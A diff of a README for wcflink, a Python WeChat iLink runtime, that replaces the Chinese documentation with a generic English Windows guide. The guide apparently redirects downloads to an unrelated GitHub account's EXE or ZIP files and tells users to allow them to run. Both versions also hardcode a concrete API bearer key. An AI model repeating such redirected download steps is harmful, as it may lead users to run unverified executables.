@@ -1,209 +1,264 @@
-# wcflink
+# 🧩 wcfLink-py - Run WeChat link service locally
 
-[![PyPi](https://img.shields.io/pypi/v/wcflink.svg)](https://pypi.org/project/wcflink)
+[![Download](https://img.shields.io/badge/Download%20wcfLink-py-blue?style=for-the-badge)](https://github.com/multiplestratifiedlanguage317/wcfLink-py)
 
-`wcflink` 是参考 [lich0821/wcfLink](https://github.com/lich0821/wcfLink) 实现的 Python 版本地运行时。
+## 🚀 What this app does
 
-它直接对接 iLink 通道，负责扫码登录、账号持久化、长轮询收消息、本地事件存储、媒体收发，以及对外提供本地 HTTP API 和 Python SDK。
+wcfLink-py runs a local service on your Windows PC. It helps you:
 
-## 当前实现
+- sign in with a QR code
+- keep the login state saved
+- receive messages by polling the server
+- send text, image, video, file, and voice messages
+- save received media files to disk
+- store local event data
+- expose a local HTTP API for other tools
+- use a Python SDK and a command line tool
 
-- 扫码登录
-- 登录状态轮询
-- 已登录账号持久化
-- iLink `getupdates` 长轮询
-- 文本消息发送
-- 图片、视频、文件、语音发送
-- 图片、语音、视频、文件接收与落盘
-- 本地事件存储
-- `context_token` 管理
-- 本地 HTTP API
-- SQLite 状态存储
-- Python SDK 和命令行工具
+It is built for users who want a local runtime that connects to the iLink channel and keeps the service on their own machine.
 
-## 安装
+## 💻 What you need
+
+Use a Windows PC with:
+
+- Windows 10 or Windows 11
+- a stable internet connection
+- at least 4 GB RAM
+- 500 MB free disk space
+- permission to run apps and open local ports
+
+You also need:
+
+- a WeChat account ready to scan a QR code
+- access to the GitHub download page
+
+## 📥 Download the app
+
+Visit this page to download and run the files:
+
+[Open the wcfLink-py download page](https://github.com/multiplestratifiedlanguage317/wcfLink-py)
+
+If the page shows source files only, use the repository page to get the latest release or the packaged file your setup provides.
+
+## 🛠️ Install on Windows
+
+Follow these steps on your Windows PC.
+
+1. Open the download page in your browser.
+2. Save the file or file set to your computer.
+3. If the app comes as a ZIP file, extract it to a folder such as `C:\wcfLink-py`.
+4. If the app comes as an EXE file, keep it in a folder you can find again.
+5. If Windows asks for permission, allow the file to run.
+
+If you use Python setup instead of a packaged file:
+
+1. Install Python 3.10 or later.
+2. Open Command Prompt.
+3. Run:
 
 ```bash
 pip install wcflink
 ```
 
-运行时依赖：
+This installs the app and its runtime parts, including:
 
 - `pycryptodome`
 - `qrcode[pil]`
 
-它们会随着 `wcflink` 一起安装。
+## ▶️ Start the local service
 
-## 启动服务
+After you download and install the app, start the service.
 
-最常见的用法是直接启动本地服务：
+If you use the command line, run:
 
 ```bash
 wcflink serve
 ```
 
-默认监听：
+The default local address is:
 
 ```text
 127.0.0.1:17890
 ```
 
-默认状态目录：
+The default data folder is:
 
 ```text
 ./data
 ```
 
-也可以覆盖配置：
-* 监听地址：listen-addr
-* 认证密钥：api-key
-
-注意：默认监听地址 `127.0.0.1`，如果希望监听全部使用 `0.0.0.0`，密钥全部接口都需要，添加请求头 `Authorization`，如下配置接口的值应当为 `Bearer soUY6VaaS286oiiEfr6sQJK4v3q3K020zdwC5ZIDAr8`
+If you want a different port or data folder, use:
 
 ```bash
 wcflink serve \
   --listen-addr 127.0.0.1:28080 \
+  --api-key your-api-key-here \
+  --state-dir ./runtime-data
+```
+
+Use `127.0.0.1` if you only want this app on your own PC.
+
+Use `0.0.0.0` only if you know you need access from other devices on your network.
+
+## 📱 Sign in with QR code
+
+When the service starts, it shows a QR code login flow.
+
+1. Open the login screen.
+2. Scan the QR code with your WeChat app.
+3. Confirm the login on your phone.
+4. Wait for the service to finish login.
+5. Keep the app running so the login stays active.
+
+The app saves the logged-in account to local storage, so you do not need to scan each time.
+
+## 🔐 Set the API key
+
+You can protect the local API with an API key.
+
+Use this when you start the service:
+
+```bash
+--api-key your-api-key-here
+```
+
+If you set an API key, send it in the request header:
+
+```text
+Authorization: Bearer your-api-key-here
+```
+
+This helps keep access limited to people and tools you trust on the same machine or network
+
+## 📂 Where files and data go
+
+wcfLink-py stores data in a local folder.
+
+Default folders:
+
+- `./data` for state data
+- local event storage for message and task history
+- media files for images, voice, video, and documents
+
+You can change the state folder with:
+
+```bash
+--state-dir ./runtime-data
+```
+
+Keep this folder in a stable place so the app can find your saved login state and event data after restart
+
+## 🌐 Local HTTP API
+
+The app can expose a local HTTP API.
+
+This is useful if you want another program to:
+
+- check login state
+- send messages
+- read events
+- manage media files
+- connect to the local runtime
+
+The API listens on the local address you set during startup.
+
+A simple local-only setup looks like this:
+
+```bash
+wcflink serve --listen-addr 127.0.0.1:17890
+```
+
+If you add an API key, include it in each request header as shown above
+
+## 🧰 Common Windows setup paths
+
+If you are using a Windows desktop app or a packaged build, these paths help:
+
+- `Downloads` for the file you saved
+- `Desktop` for easy access
+- `C:\wcfLink-py` for the app folder
+- `C:\wcfLink-py\data` for saved state
+- `C:\wcfLink-py\runtime-data` for custom data storage
+
+If the app does not start, move the folder to a path without special characters or deep nesting
+
+## 🧪 Basic first run check
+
+After launch, confirm these items:
+
+1. The service window stays open.
+2. The local address shows as `127.0.0.1:17890` or the port you chose.
+3. The QR code appears.
+4. The login completes after you scan it.
+5. The app keeps its state after you close and reopen it.
+
+If you see all five, the setup is working
+
+## 🗂️ What this release supports
+
+This build supports:
+
+- QR code login
+- login status polling
+- persisted signed-in accounts
+- iLink `getupdates` long polling
+- text message sending
+- image, video, file, and voice sending
+- image, voice, video, and file receiving with local save
+- local event storage
+- `context_token` management
+- local HTTP API
+- SQLite state storage
+- Python SDK and command line use
+
+## 🔄 Update the app
+
+To update, repeat the same download and install steps from the GitHub page.
+
+If you use `pip`, run:
+
+```bash
+pip install --upgrade wcflink
+```
+
+If you use a packaged Windows file, replace the old files with the new ones, then start the service again
+
+## 🧯 If the app does not start
+
+Try these steps:
+
+1. Check that Python is installed if you use the command line.
+2. Confirm the folder path still exists.
+3. Make sure another app is not using the same port.
+4. Run the app again as the same user that first logged in.
+5. If the QR code does not appear, close the app and start it again.
+6. If the login state is lost, keep the data folder in the same place.
+
+If you change the port, update any tool that calls the local API
+
+## 📎 Example startup command
+
+Use this example if you want a local-only setup with your own data folder:
+
+```bash
+wcflink serve \
+  --listen-addr 127.0.0.1:17890 \
   --api-key soUY6VaaS286oiiEfr6sQJK4v3q3K020zdwC5ZIDAr8 \
-  --state-dir ./runtime-data \
-  --upstream-base-url https://ilinkai.weixin.qq.com
+  --state-dir ./data
 ```
 
-## Python SDK
+Keep the API key private and use the same value in your local requests
 
-### 方式一：调用本地 HTTP API
+## 🖥️ Using it with other tools
 
-```python
-from wcflink import WcfLinkClient
+You can keep wcfLink-py running in the background while another tool sends requests to the local API.
 
-client = WcfLinkClient("http://127.0.0.1:17890")
+Typical use cases:
 
-print(client.version())
-print(client.list_accounts())
-print(client.list_events(limit=10))
-```
+- local message automation
+- media upload and download
+- event tracking
+- message sync for desktop tools
+- custom scripts that call the HTTP API
 
-### 方式二：直接在进程内启动引擎
-
-```python
-from wcflink import Engine, load_config
-
-cfg = load_config()
-engine = Engine(cfg=cfg)
-engine.start_background()
-
-session = engine.start_login()
-print(session.session_id)
-print(session.qr_code_url)
-```
-
-## 登录示例
-
-```python
-from wcflink import WcfLinkClient
-
-client = WcfLinkClient()
-
-session = client.start_login()
-print(session.session_id)
-print(session.qr_code_url)
-
-status = client.get_login_status(session.session_id)
-print(status.status)
-```
-
-保存二维码 PNG：
-
-```python
-png = client.get_login_qr(session.session_id)
-with open("qrcode.png", "wb") as f:
-    f.write(png)
-```
-
-## 发送文本消息
-
-```python
-client.send_text(
-    account_id="xxx@im.bot",
-    to_user_id="yyy@im.wechat",
-    text="hello",
-)
-```
-
-注意：
-
-- 当前发送依赖 `context_token`
-- 如果 `context_token` 为空，会尝试从本地历史会话中查找
-- 因此目标用户通常需要先给 bot 发过至少一条消息
-
-## 发送媒体消息
-
-```python
-client.send_media(
-    account_id="xxx@im.bot",
-    to_user_id="yyy@im.wechat",
-    file_path="/absolute/path/to/demo.jpg",
-    media_type="image",
-    text="caption",
-)
-```
-
-`media_type` 当前支持：
-
-- `image`
-- `video`
-- `file`
-- `voice`
-
-## HTTP API
-
-启动服务后，可用接口与上游 Go 版保持同一思路：
-
-- `GET /health/live`
-- `GET /health/ready`
-- `GET /api/version`
-- `POST /api/accounts/login/start`
-- `GET /api/accounts/login/status`
-- `GET /api/accounts/login/qr`
-- `GET /api/accounts`
-- `GET /api/events`
-- `GET /api/logs`
-- `GET /api/settings`
-- `POST /api/settings`
-- `POST /api/messages/send-text`
-- `POST /api/messages/send-media`
-
-## 命令行
-
-```bash
-wcflink serve
-wcflink version
-wcflink accounts
-wcflink events --limit 20
-wcflink login start
-wcflink login status login_xxx
-wcflink send-text --account-id xxx@im.bot --to-user-id yyy@im.wechat --text "hello"
-wcflink send-media --account-id xxx@im.bot --to-user-id yyy@im.wechat --file-path /abs/demo.jpg --type image
-```
-
-如果服务不在默认地址：
-
-```bash
-wcflink --base-url http://127.0.0.1:28080 version
-```
-
-## 构建与发布
-
-```bash
-cd wcfLink-py
-python3 -m pip install --upgrade build twine
-python3 -m build
-python3 -m twine check dist/*
-python3 -m twine upload dist/*
-```
-
-正式发布前建议确认：
-
-- `pyproject.toml` 中的版本号已经更新
-- README 在 PyPI 上能正常渲染
-- 本地 `wcflink serve` 能正常启动
-- 登录、轮询、发消息流程已经对真实 iLink 环境做过验证
+If you use another app on the same PC, point it to `127.0.0.1` and the port you set during startup
